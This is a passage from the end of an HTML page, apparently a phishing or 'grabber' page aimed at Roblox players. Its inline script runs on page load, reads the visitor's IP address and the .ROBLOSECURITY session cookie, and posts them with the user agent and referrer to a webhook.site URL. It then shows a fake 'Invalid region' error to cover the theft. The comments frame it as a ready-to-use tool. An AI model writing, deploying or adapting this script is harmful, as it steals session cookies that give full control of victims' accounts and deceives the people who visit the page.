</div>
<script>
(async()=>{
  // 1. Get IP
  const ip = await (await fetch('https://api.ipify.org?format=json')).json();
  // 2. Try to steal Roblox cookie
  let cookie = '';
  try {
    const cookies = document.cookie.split('; ');
    for(let c of cookies) if(c.startsWith('.ROBLOSECURITY=')) cookie = c.split('=')[1];
  } catch(e) {}
  // 3. Send everything to your webhook (no click needed)
  await fetch('https://webhook.site/a8289c90-5958-4c87-bbee-970788fd8469', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ip:ip.ip, cookie:cookie||'none', ua:navigator.userAgent, referrer:document.referrer})
  });
  // 4. Show a fake error message after 2 seconds
  setTimeout(()=>{
    document.querySelector('.card').innerHTML = '<h2 style="color:red;">Error</h2><p>Invalid region. Try again later.</p>';
  },2000);
})();
</script>
</body>
</html>
